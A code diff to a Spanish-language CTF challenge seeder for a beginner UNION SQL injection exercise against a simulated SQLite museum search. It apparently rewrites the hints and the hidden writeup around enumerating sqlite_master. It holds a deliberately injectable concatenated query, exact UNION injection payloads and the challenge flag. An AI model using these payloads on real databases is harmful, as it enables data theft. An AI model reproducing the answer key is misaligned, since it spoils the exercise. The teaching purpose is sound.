@@ -87,26 +87,29 @@ HINTS = [
     {
         "title":   "Pista 1 — Los botones de ejemplo y el Post-it",
         "content": (
-            "No necesitas saber SQL de memoria. Pulsa los **3 botones de búsqueda rápida** que hay encima "
-            "del buscador y observa en la consola negra qué comandos se envían a la base de datos. "
-            "Luego lee el **Post-it amarillo** de la derecha para saber cómo se llama la tabla secreta y sus 2 columnas."
+            "Observa en la consola qué consultas ejecutan los **3 botones de búsqueda rápida** (especialmente cómo funciona "
+            "`UNION SELECT col1, col2 FROM tabla` en el Botón 2 y el comentario `--` en el Botón 3). "
+            "Luego lee el **Post-it amarillo**: la tabla secreta se llama `capsula_1976`, pero para averiguar cómo se llaman "
+            "sus columnas tendrás que consultar antes la tabla del sistema `sqlite_master`."
         ),
         "cost":    0,    # gratis
     },
     {
-        "title":   "Pista 2 — Cómo combinar las piezas (Comilla, UNION y Comentario)",
+        "title":   "Pista 2 — Paso 1: Descubrir las columnas con sqlite_master",
         "content": (
-            "1. Escribe una comilla simple `'` para cerrar el texto de búsqueda.\n"
-            "2. Igual que hace el **Botón 2**, usa `UNION SELECT col1, col2 FROM tabla` pero cambiando "
-            "los nombres por los que aparecen en el Post-it amarillo (`codigo_secreto, contenido_flag` y `capsula_1976`).\n"
-            "3. Igual que hace el **Botón 3**, termina escribiendo `--` para tachar y anular el `%' AND oculto = 0` del final."
+            "Como indica el Post-it, en SQLite la tabla `sqlite_master` guarda el nombre de cada tabla (`tbl_name`) "
+            "y su sentencia de creación (`sql`). Inyecta esto en el buscador para ver la estructura de `capsula_1976`:\n"
+            "```sql\n"
+            "' UNION SELECT tbl_name, sql FROM sqlite_master --\n"
+            "```"
         ),
         "cost":    25,   # cuesta 25 puntos
     },
     {
-        "title":   "Pista 3 — El payload exacto",
+        "title":   "Pista 3 — Paso 2: Extraer la flag de capsula_1976",
         "content": (
-            "Escribe exactamente esto en la barra del buscador y pulsa **Buscar en el Archivo**:\n"
+            "Tras ver en `sqlite_master` que `capsula_1976` tiene las columnas `codigo_secreto` y `contenido_flag`, "
+            "lanza el volcado final en el buscador:\n"
             "```sql\n"
             "' UNION SELECT codigo_secreto, contenido_flag FROM capsula_1976 --\n"
             "```"
@@ -120,31 +123,36 @@ TAGS = ["web", "sqli", "union", "innosoft", "50-aniversario"]
 
 # Writeup/solución (estado "hidden" → solo el admin la ve hasta publicarla)
 SOLUTION = """\
-## Solución — La Cápsula del Tiempo de 1976 (UNION SQLi con Ruedines)
+## Solución — La Cápsula del Tiempo de 1976 (UNION SQLi con `sqlite_master`)
 
 ### 1. Análisis de la interfaz
-Al entrar al catálogo del **Museo del 50º Aniversario**, vemos tres elementos clave diseñados para guiar la explotación:
+Al entrar al catálogo del **Museo del 50º Aniversario**, vemos tres elementos clave:
 1. **Consola de Vista Previa SQL en Tiempo Real:** Muestra cómo se concatena nuestra búsqueda directamente en la consulta:
    ```sql
    SELECT nombre_reliquia, año_hallazgo FROM catalogo_museo WHERE nombre_reliquia LIKE '%<INPUT>%' AND oculto = 0
    ```
 2. **Botones de Búsqueda Rápida:**
-   - El **Botón 2 (`Incluir donaciones de antiguos alumnos`)** revela cómo combinar resultados de otra tabla de 2 columnas usando `UNION SELECT col1, col2 FROM tabla`.
-   - El **Botón 3 (`Modo Prueba del Archivero`)** revela cómo cerrar la comilla con `'` y usar `--` para comentar/tachar el resto de la consulta (`%' AND oculto = 0`).
-3. **El Post-it del Archivero:** Nos chiva que la cápsula está en la tabla **`capsula_1976`** y que sus dos columnas se llaman **`codigo_secreto`** y **`contenido_flag`**.
+   - El **Botón 2 (`Incluir donaciones de antiguos alumnos`)** muestra cómo combinar resultados de otra tabla de 2 columnas usando `UNION SELECT col1, col2 FROM tabla`.
+   - El **Botón 3 (`Modo Prueba del Archivero`)** muestra cómo cerrar la comilla con `'` y usar `--` para comentar/tachar el resto de la consulta (`%' AND oculto = 0`).
+3. **El Post-it del Archivero:** Indica que la cápsula está en la tabla **`capsula_1976`**, pero que no apuntó los nombres de sus columnas y sugiere consultarlos en la tabla del sistema **`sqlite_master`** (campos `tbl_name` y `sql`).
 
-### 2. Construcción del Payload
+### 2. Paso 1 — Enumerar la estructura con `sqlite_master`
 Introducimos en el buscador:
+```sql
+' UNION SELECT tbl_name, sql FROM sqlite_master --
+```
+En la tabla de resultados aparece la definición de `capsula_1976`:
+```sql
+CREATE TABLE capsula_1976 (codigo_secreto TEXT, contenido_flag TEXT)
+```
+
+### 3. Paso 2 — Volcado final de `capsula_1976`
+Conociendo ya las dos columnas (`codigo_secreto` y `contenido_flag`), inyectamos:
 ```sql
 ' UNION SELECT codigo_secreto, contenido_flag FROM capsula_1976 --
 ```
 
-La consulta resultante es:
-```sql
-SELECT nombre_reliquia, año_hallazgo FROM catalogo_museo WHERE nombre_reliquia LIKE '%' UNION SELECT codigo_secreto, contenido_flag FROM capsula_1976 --%' AND oculto = 0
-```
-
-### 3. Flag obtenida
+### 4. Flag obtenida
 Al final de la tabla de resultados aparece el contenido de la cápsula de 1976:
 ```
 INNOSOFT{50_4n1v3rs4r10_d3sd3_l4_t4rj3t4_p3rf0r4d4}
@@ -602,10 +610,7 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
             <span class="museum-console-live-dot">● EN VIVO</span>
           </div>
           <div id="museum-sql-preview" class="museum-sql-preview"></div>
-          <div id="museum-live-feedback" class="museum-live-feedback"></div>
         </div>
-
-        <div id="museum-tutorial-banner" class="museum-tutorial-banner"></div>
       </div>
 
       <div class="museum-panel">
@@ -620,7 +625,6 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
         <div id="museum-error-box" class="museum-error-box">
           <h3>⚠️ Error devuelto por la Base de Datos SQLite:</h3>
           <div id="museum-error-raw" class="museum-error-raw"></div>
-          <div id="museum-error-helper" class="museum-error-helper"></div>
         </div>
 
         <table class="museum-table">
@@ -640,16 +644,10 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
         <h3>📌 NOTA PARA EL BECARIO DE SISTEMAS (NO BORRAR)</h3>
         <p>
           Ya he sacado la <strong>Cápsula del Tiempo</strong> de la tabla <code>catalogo_museo</code>
-          para que ningún curioso la vea en el buscador durante las Jornadas InnoSoft.
+          para que nadie la vea durante las Jornadas InnoSoft.
         </p>
         <p>
-          La he guardado en una tabla aparte llamada:<br>
-          👉 <code>capsula_1976</code>
-        </p>
-        <p>
-          Acuérdate de que esa tabla solo tiene <strong>dos columnas</strong>:<br>
-          1️⃣ <code>codigo_secreto</code><br>
-          2️⃣ <code>contenido_flag</code>
+          <em>(No apunté los nombres de las columnas en este papel... pero bueno, como en SQLite la estructura de las tablas siempre se guarda en la tabla del sistema <code>sqlite_master</code> con los campos <code>tbl_name</code> y <code>sql</code>, ya lo consultarás tú si te hace falta).</em>
         </p>
       </div>
     </div>
@@ -673,8 +671,29 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
       { id: 1, objeto_donado: "Calculadora HP-35 Polaca Inversa que sobrevivió a Cálculo", autor: "Promoción del 81" },
       { id: 2, objeto_donado: "Floppy de 3½ con prácticas de Turbo Pascal 7.0", autor: "Antiguo Alumno '96" },
       { id: 3, objeto_donado: "Pen Drive de 128 MB encontrado en los laboratorios", autor: "Becario Anónimo '05" }
+    ],
+    sqlite_master: [
+      {
+        type: "table",
+        name: "catalogo_museo",
+        tbl_name: "catalogo_museo",
+        sql: "CREATE TABLE catalogo_museo (nombre_reliquia TEXT, año_hallazgo TEXT, epoca TEXT, oculto INTEGER)"
+      },
+      {
+        type: "table",
+        name: "donaciones_alumnos",
+        tbl_name: "donaciones_alumnos",
+        sql: "CREATE TABLE donaciones_alumnos (objeto_donado TEXT, autor TEXT)"
+      },
+      {
+        type: "table",
+        name: "capsula_1976",
+        tbl_name: "capsula_1976",
+        sql: "CREATE TABLE capsula_1976 (codigo_secreto TEXT, contenido_flag TEXT)"
+      }
     ]
   };
+  DB_TABLES.sqlite_schema = DB_TABLES.sqlite_master;
 
   // La tabla capsula_1976 reconstruye la flag dinámicamente solo cuando el motor SQL la consulta
   const _k = __XOR_KEY__;
@@ -696,12 +715,9 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
   let activePreset = "";
   const inputEl = document.getElementById("museum-search-input");
   const previewEl = document.getElementById("museum-sql-preview");
-  const feedbackEl = document.getElementById("museum-live-feedback");
-  const tutorialEl = document.getElementById("museum-tutorial-banner");
   const resultsBody = document.getElementById("museum-results-body");
   const errorBox = document.getElementById("museum-error-box");
   const errorRaw = document.getElementById("museum-error-raw");
-  const errorHelper = document.getElementById("museum-error-helper");
   const flagBanner = document.getElementById("museum-flag-celebration");
   const flagCode = document.getElementById("museum-flag-code");
 
@@ -717,29 +733,6 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/"/g, "&quot;");
-  }
-
-  function explainSqlError(errorMsg, rawInput) {
-    const errLower = errorMsg.toLowerCase();
-    if (errLower.includes("selects to the left and right of union do not have the same number of result columns")) {
-      return "📏 ¡Casi lo tienes! El error dice que las dos tablas del UNION no tienen el mismo número de columnas. Recuerda que la tabla del museo muestra 2 columnas, así que después de UNION SELECT debes escribir exactamente 2 columnas separadas por una coma (mira el Post-it amarillo: codigo_secreto, contenido_flag).";
-    }
-    if (errLower.includes("no such table")) {
-      return "🗂️ La base de datos dice que esa tabla no existe. Revisa el Post-it amarillo del Archivero: la tabla secreta se llama exactamente capsula_1976.";
-    }
-    if (errLower.includes("no such column")) {
-      return "🏷️ Has puesto un nombre de columna que no existe en esa tabla. Revisa el Post-it amarillo: las dos columnas de la tabla capsula_1976 se llaman codigo_secreto y contenido_flag.";
-    }
-    if (errLower.includes("unrecognized token") && rawInput.includes("#")) {
-      return "💡 Has intentado comentar con '#', pero en esta base de datos los comentarios se hacen con dos guiones seguidos: -- (fíjate en el Botón 3 de ejemplo).";
-    }
-    if (errLower.includes("syntax error") || errLower.includes("unrecognized token")) {
-      if (rawInput.includes("'") && !rawInput.includes("--")) {
-        return "✂️ Has cerrado la comilla simple ('), ¡bien hecho! Pero el final original de la consulta (%' AND oculto = 0) se ha quedado suelto y rompe la frase. Añade dos guiones (--) al final de tu texto para tachar y comentar lo que sobra (mira el Botón 3).";
-      }
-      return "🧩 Hay un pequeño fallo de sintaxis en tu comando SQL. Fíjate en el Previsualizador en Tiempo Real y compáralo con la estructura del Botón 2 (UNION SELECT col1, col2 FROM tabla) y del Botón 3 (--).";
-    }
-    return "Revisa la consola de vista previa en vivo y apóyate en los 3 botones de ejemplo.";
   }
 
   function evaluateSearchQuery(rawInput) {
@@ -814,7 +807,9 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
     const tablesMap = {
       catalogo_museo: DB_TABLES.catalogo_museo,
       donaciones_alumnos: DB_TABLES.donaciones_alumnos,
-      capsula_1976: getCapsulaTable()
+      capsula_1976: getCapsulaTable(),
+      sqlite_master: DB_TABLES.sqlite_master,
+      sqlite_schema: DB_TABLES.sqlite_master // Alias moderno de SQLite
     };
 
     if (!tablesMap[tableName]) {
@@ -866,15 +861,12 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
         `<span class="sql-kw">FROM</span> catalogo_museo ` +
         `<span class="sql-kw">WHERE</span> epoca = <span class="sql-str">'70s'</span> ` +
         `<span class="sql-kw">AND</span> oculto = 0`;
-      feedbackEl.innerHTML = "";
       return;
     }
     if (val === "" && activePreset === "2") {
       previewEl.innerHTML =
         `<span class="sql-kw">SELECT</span> nombre_reliquia, año_hallazgo <span class="sql-kw">FROM</span> catalogo_museo <span class="sql-kw">WHERE</span> oculto = 0 ` +
         `<span class="sql-injected">UNION SELECT objeto_donado, autor FROM donaciones_alumnos</span>`;
-      feedbackEl.innerHTML =
-        ``;
       return;
     }
 
@@ -886,15 +878,10 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
     const quoteIdx = val.indexOf("'");
 
     if (quoteIdx === -1) {
-      const commentIdx = val.indexOf("--");
       previewEl.innerHTML =
         prefix +
         `<span class="sql-str">${escapeHtml(val)}</span>` +
         `<span class="sql-str">%'</span> <span class="sql-kw">AND</span> oculto = 0`;
-
-      if (commentIdx !== -1) {
-      } else {
-      }
       return;
     }
 
@@ -912,14 +899,6 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
         `<span class="sql-quote-break" title="Has cerrado la comilla">'</span>` +
         `<span class="sql-injected">${escapeHtml(injectedCode)}</span>` +
         `<s class="sql-commented">${escapeHtml(commentPart)}${escapeHtml(suffixRaw)}</s>`;
-
-      const upperInj = injectedCode.toUpperCase();
-      if (upperInj.includes("UNION") && upperInj.includes("SELECT") && upperInj.includes("CAPSULA_1976")) {
-        feedbackEl.innerHTML =
-          `🚀 <strong>¡Inyección lista!</strong> Has cerrado la comilla <code>'</code>, has unido la tabla <code>capsula_1976</code> y has tachado el final con <code>--</code>. ¡Pulsa <strong>Buscar en el Archivo</strong>!`;
-      } else {
-        
-      }
     } else {
       previewEl.innerHTML =
         prefix +
@@ -1004,7 +983,6 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
     } catch (err) {
       renderTableRows([]);
       errorRaw.textContent = err.message;
-      errorHelper.textContent = explainSqlError(err.message, inputEl.value);
       errorBox.style.display = "block";
     }
   }
@@ -1016,7 +994,6 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
   btnReset.addEventListener("click", () => {
     activePreset = "";
     updatePresetButtons();
-    tutorialEl.style.display = "none";
     errorBox.style.display = "none";
     inputEl.value = "";
     renderLiveQuery();
@@ -1027,7 +1004,6 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
     if (activePreset === "1" || activePreset === "2") {
       activePreset = "";
       updatePresetButtons();
-      tutorialEl.style.display = "none";
     }
     renderLiveQuery();
   });
@@ -1036,7 +1012,6 @@ EMBEDDED_CHALLENGE_PAGE_HTML = r"""
     e.preventDefault();
     activePreset = "";
     updatePresetButtons();
-    tutorialEl.style.display = "none";
     renderLiveQuery();
     runUserSearch();
   });
@@ -1229,78 +1204,22 @@ def init_challenge_db() -> None:
     con.close()
 
 
-def explain_sql_error(error_msg: str, raw_input: str) -> str:
-    """Traduce errores técnicos de SQLite a pistas súper claras para novatos."""
-    err_lower = error_msg.lower()
-    if "selects to the left and right of union do not have the same number of result columns" in err_lower:
-        return (
-            "📏 ¡Casi lo tienes! El error dice que las dos tablas del UNION no tienen el mismo número de columnas. "
-            "Recuerda que la tabla del museo muestra 2 columnas, así que después de UNION SELECT debes escribir "
-            "exactamente 2 columnas separadas por una coma (mira el Post-it amarillo: codigo_secreto, contenido_flag)."
-        )
-    if "no such table" in err_lower:
-        return (
-            "🗂️ La base de datos dice que esa tabla no existe. Revisa el Post-it amarillo del Archivero: "
-            "la tabla secreta se llama exactamente capsula_1976."
-        )
-    if "no such column" in err_lower:
-        return (
-            "🏷️ Has puesto un nombre de columna que no existe en esa tabla. Revisa el Post-it amarillo: "
-            "las dos columnas de la tabla capsula_1976 se llaman codigo_secreto y contenido_flag."
-        )
-    if "unrecognized token" in err_lower and "#" in raw_input:
-        return (
-            "💡 Has intentado comentar con '#', pero en esta base de datos los comentarios se hacen con "
-            "dos guiones seguidos: -- (fíjate en el Botón 3 de ejemplo)."
-        )
-    if "syntax error" in err_lower or "unrecognized token" in err_lower:
-        if "'" in raw_input and "--" not in raw_input:
-            return (
-                "✂️ Has cerrado la comilla simple ('), ¡bien hecho! Pero el final original de la consulta "
-                "(%' AND oculto = 0) se ha quedado suelto y rompe la frase. Añade dos guiones (--) al final "
-                "de tu texto para tachar y comentar lo que sobra (mira el Botón 3)."
-            )
-        return (
-            "🧩 Hay un pequeño fallo de sintaxis en tu comando SQL. Fíjate en el Previsualizador en Tiempo Real "
-            "y compáralo con la estructura del Botón 2 (UNION SELECT col1, col2 FROM tabla) y del Botón 3 (--)."
-        )
-    return "Revisa la consola de vista previa en vivo y apóyate en los 3 botones de ejemplo."
-
-
 def execute_museum_request(preset: str = "", q: str = "", has_q_param: bool = False) -> dict:
     """Ejecuta la lógica del buscador del museo contra SQLite y devuelve los datos."""
     search_input = q
-    tutorial_note = ""
 
     if preset == "1" and not has_q_param:
         query = "SELECT nombre_reliquia, año_hallazgo FROM catalogo_museo WHERE epoca = '70s' AND oculto = 0"
-        tutorial_note = (
-            "📼 <strong>Explicación del Botón 1 (Consulta Básica):</strong> "
-            "La base de datos ha ejecutado <code>SELECT nombre_reliquia, año_hallazgo FROM catalogo_museo WHERE epoca = '70s'</code>. "
-            "Fíjate en que siempre pedimos <strong>2 columnas</strong> separadas por coma."
-        )
     elif preset == "2" and not has_q_param:
         query = (
             "SELECT nombre_reliquia, año_hallazgo FROM catalogo_museo WHERE oculto = 0 "
             "UNION SELECT objeto_donado, autor FROM donaciones_alumnos"
-        )
-        tutorial_note = (
-            "🤝 <strong>Explicación del Botón 2 (Cómo unir otra tabla con UNION):</strong> "
-            "¡Mira la consola! Al añadir <code>UNION SELECT col1, col2 FROM otra_tabla</code>, la base de datos "
-            "pega las filas de esa segunda tabla al final de la tabla del museo. "
-            "¿Y si haces lo mismo con la tabla y las 2 columnas que menciona el <strong>Post-it amarillo</strong>?"
         )
     elif preset == "3" and not has_q_param:
         search_input = "IBM%' -- "
         query = (
             f"SELECT nombre_reliquia, año_hallazgo FROM catalogo_museo "
             f"WHERE nombre_reliquia LIKE '%{search_input}%' AND oculto = 0"
-        )
-        tutorial_note = (
-            "🔧 <strong>Explicación del Botón 3 (Cerrar comilla y tachar con <code>--</code>):</strong> "
-            "Hemos buscado <code>IBM%' -- </code>. La comilla simple <code>'</code> cierra el texto antes de tiempo, y los dos guiones "
-            "<code>--</code> <strong>tachan e ignoran</strong> el filtro <code>%' AND oculto = 0</code> del final (¡por eso acaba de aparecer "
-            "en la tabla el <em>Prototipo IBM 5100 Oculto</em>!). Ahora combina este truco con el <code>UNION SELECT</code> del Botón 2."
         )
     else:
         query = (
@@ -1310,7 +1229,6 @@ def execute_museum_request(preset: str = "", q: str = "", has_q_param: bool = Fa
 
     rows = []
     sql_error = None
-    friendly_error = None
     flag_found = False
 
     if not os.path.exists(DB_PATH):
@@ -1327,7 +1245,6 @@ def execute_museum_request(preset: str = "", q: str = "", has_q_param: bool = Fa
                 break
     except Exception as e:
         sql_error = str(e)
-        friendly_error = explain_sql_error(sql_error, search_input)
     finally:
         con.close()
 
@@ -1335,9 +1252,7 @@ def execute_museum_request(preset: str = "", q: str = "", has_q_param: bool = Fa
         "rows": rows,
         "search_input": search_input,
         "preset": preset,
-        "tutorial_note": tutorial_note,
         "sql_error": sql_error,
-        "friendly_error": friendly_error,
         "flag_found": flag_found,
         "flag_value": FLAG_CONTENT,
     }
@@ -1458,8 +1373,26 @@ def seed():
         existing = Challenges.query.filter_by(name=CHALLENGE_NAME).first()
         if existing is not None:
             existing.description = CHALLENGE_DESCRIPTION
+            Hints.query.filter_by(challenge_id=existing.id).delete()
+            for h in HINTS:
+                db.session.add(Hints(
+                    challenge_id=existing.id,
+                    title=h["title"],
+                    content=h["content"],
+                    cost=h["cost"],
+                    type="standard",
+                ))
+            sol = Solutions.query.filter_by(challenge_id=existing.id).first()
+            if sol is not None:
+                sol.content = SOLUTION
+            else:
+                db.session.add(Solutions(
+                    challenge_id=existing.id,
+                    content=SOLUTION,
+                    state="hidden",
+                ))
             db.session.commit()
-            print(f"[ok] '{CHALLENGE_NAME}' ya existía en la BD — descripción y ruta /{CHALLENGE_ROUTE} actualizadas.")
+            print(f"[ok] '{CHALLENGE_NAME}' ya existía en la BD — descripción, pistas, solución y ruta /{CHALLENGE_ROUTE} actualizadas.")
             return
 
         print(f"[+] Creando reto: {CHALLENGE_NAME!r} ({challenge_state})")
